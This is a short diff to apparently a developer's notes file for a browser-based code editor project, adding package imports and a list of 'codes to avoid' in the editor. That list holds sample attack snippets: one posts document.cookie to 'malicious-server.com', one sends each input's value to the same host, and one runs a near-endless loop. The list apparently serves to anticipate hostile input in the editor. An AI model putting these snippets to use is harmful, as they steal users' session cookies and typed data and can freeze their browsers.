@@ -22,8 +22,26 @@ yarn add localforage
 import 'bulma/css/bulma.css';
 'https://unpkg.com/bulma/css/bulma.css'.match(/.css$/)
 
-test
+test on textarea
 import 'tiny-test-pkg';
 import 'bulma/css/bulma.css';
+import axios from "axios";
+window.axios = axios;
 
 https://unpkg.com/esbuild-wasm@0.8.27/esbuild.wasm
+
+
+-- codes to avoid on code text editor
+axios.post('http://malicious-server.com', {
+    cookie: document.cookie
+});
+
+document.querySelector('input').addEventListener('change', (event) => {
+    axios.post('http://malicious-server.com', {
+        value: event.target.value
+    });
+})
+
+for (var i = 0; i < 9999999999; i++) {
+    console.log(i);
+}
